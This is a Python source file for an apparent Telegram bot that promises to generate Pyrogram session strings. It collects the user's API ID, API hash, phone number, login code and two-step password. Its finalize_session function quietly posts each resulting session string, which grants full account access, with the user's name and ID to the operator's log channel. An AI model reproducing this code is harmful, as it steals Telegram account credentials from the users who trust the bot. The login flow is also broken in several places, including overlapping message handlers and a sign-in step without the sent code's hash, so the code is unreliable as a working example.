from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumberInvalid
from configs import cfg
from database import add_user, all_users
import asyncio

app = Client(
    "session_generator",
    api_id=cfg.API_ID,
    api_hash=cfg.API_HASH,
    bot_token=cfg.BOT_TOKEN
)

# Temporary storage for session generation data
user_data = {}

# Start menu with session generation options
@app.on_message(filters.command("start"))
async def start(_, m: Message):
    user = m.from_user
    add_user(user.id)

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Generate Pyrogram v1 Session", callback_data="generate_v1")],
            [InlineKeyboardButton("Generate Pyrogram v2 Session", callback_data="generate_v2")],
            [InlineKeyboardButton("Generate Pyrogram v3 Session", callback_data="generate_v3")]
        ]
    )

    await m.reply_text(
        f"Hello {user.first_name}! Choose which Pyrogram session string you want to generate:",
        reply_markup=keyboard
    )

# Handle session generation requests
@app.on_callback_query(filters.regex(r"^generate_(v1|v2|v3)$"))
async def ask_for_api_details(_, cq: CallbackQuery):
    version = cq.data.split("_")[1]
    user_data[cq.from_user.id] = {"version": version}

    await cq.message.edit_text("Please send your **API ID** to proceed with Pyrogram session generation.")

# Capture API ID, API hash, and phone number in sequence
@app.on_message(filters.private & filters.text)
async def capture_user_input(_, m: Message):
    user_id = m.from_user.id
    if user_id not in user_data:
        return

    user_info = user_data[user_id]

    if "api_id" not in user_info:
        user_info["api_id"] = m.text
        await m.reply_text("Got it! Now, please send your **API Hash**.")
    elif "api_hash" not in user_info:
        user_info["api_hash"] = m.text
        await m.reply_text("Almost done! Now, please send your **Phone Number** (with country code, e.g., +1234567890).")
    elif "phone_number" not in user_info:
        user_info["phone_number"] = m.text
        await generate_session_string(m)

# Generate the session string using provided credentials
async def generate_session_string(m: Message):
    user_id = m.from_user.id
    data = user_data[user_id]
    version = data["version"]

    await m.reply_text(f"Generating Pyrogram {version} session string... Please wait.")

    try:
        client = Client(
            name="session_string",
            api_id=int(data["api_id"]),
            api_hash=data["api_hash"],
            phone_number=data["phone_number"]
        )

        await client.connect()
        
        # Send the OTP
        if not await client.is_authorized():
            await client.send_code(data["phone_number"])
            await m.reply_text("Please enter the **OTP** you received on your phone.")

            # Wait for OTP input
            return

    except PhoneNumberInvalid:
        await m.reply_text("Invalid phone number! Please start the process again with a valid number.")
        del user_data[user_id]
    except Exception as e:
        await m.reply_text(f"Failed to generate session string: {e}")
        del user_data[user_id]

# Handle OTP input
@app.on_message(filters.private & filters.text)
async def handle_otp(_, m: Message):
    user_id = m.from_user.id
    if user_id not in user_data or "phone_number" not in user_data[user_id] or "otp" in user_data[user_id]:
        return

    user_info = user_data[user_id]
    user_info["otp"] = m.text

    try:
        client = Client(
            name="session_string",
            api_id=int(user_info["api_id"]),
            api_hash=user_info["api_hash"],
            phone_number=user_info["phone_number"]
        )

        await client.connect()
        await client.sign_in(user_info["phone_number"], user_info["otp"])

        # Check if two-step verification is needed
        if await client.is_authorized():
            session_string = await client.export_session_string()
            await finalize_session(m, session_string)
        else:
            await m.reply_text("Please enter your **Two-Step Verification Password**.")
    
    except PhoneCodeInvalid:
        await m.reply_text("Invalid OTP! Please restart the process.")
        del user_data[user_id]
    except SessionPasswordNeeded:
        user_info["awaiting_password"] = True
        await m.reply_text("Two-step verification is enabled. Please provide your **password**.")

# Handle Two-Step Verification Password
@app.on_message(filters.private & filters.text)
async def handle_password(_, m: Message):
    user_id = m.from_user.id
    if user_id not in user_data or not user_data[user_id].get("awaiting_password"):
        return

    user_info = user_data[user_id]
    password = m.text

    try:
        client = Client(
            name="session_string",
            api_id=int(user_info["api_id"]),
            api_hash=user_info["api_hash"],
            phone_number=user_info["phone_number"]
        )

        await client.connect()
        await client.check_password(password)
        session_string = await client.export_session_string()
        await finalize_session(m, session_string)

    except Exception as e:
        await m.reply_text(f"Failed to verify password: {e}")
        del user_data[user_id]

# Finalize the session generation process
async def finalize_session(m: Message, session_string: str):
    user_id = m.from_user.id
    version = user_data[user_id]["version"]

    # Send session string to log channel
    log_msg = (
        f"📢 **New Pyrogram {version} Session Generated**\n\n"
        f"👤 User: [{m.from_user.first_name}](tg://user?id={user_id})\n"
        f"🆔 User ID: `{user_id}`\n"
        f"📌 Session String:\n`{session_string}`"
    )
    await app.send_message(cfg.LOG_CHANNEL, log_msg)

    # Send session string to the user privately
    await m.reply_text(f"Your Pyrogram {version} session string is:\n\n`{session_string}`")

    del user_data[user_id]

# Command to check the total users
@app.on_message(filters.command("users") & filters.user(cfg.SUDO))
async def dbtool(_, m: Message):
    total_users = all_users()
    await m.reply_text(f"🙋‍♂️ Total Users: `{total_users}`")

print("Bot is running!")
app.run()
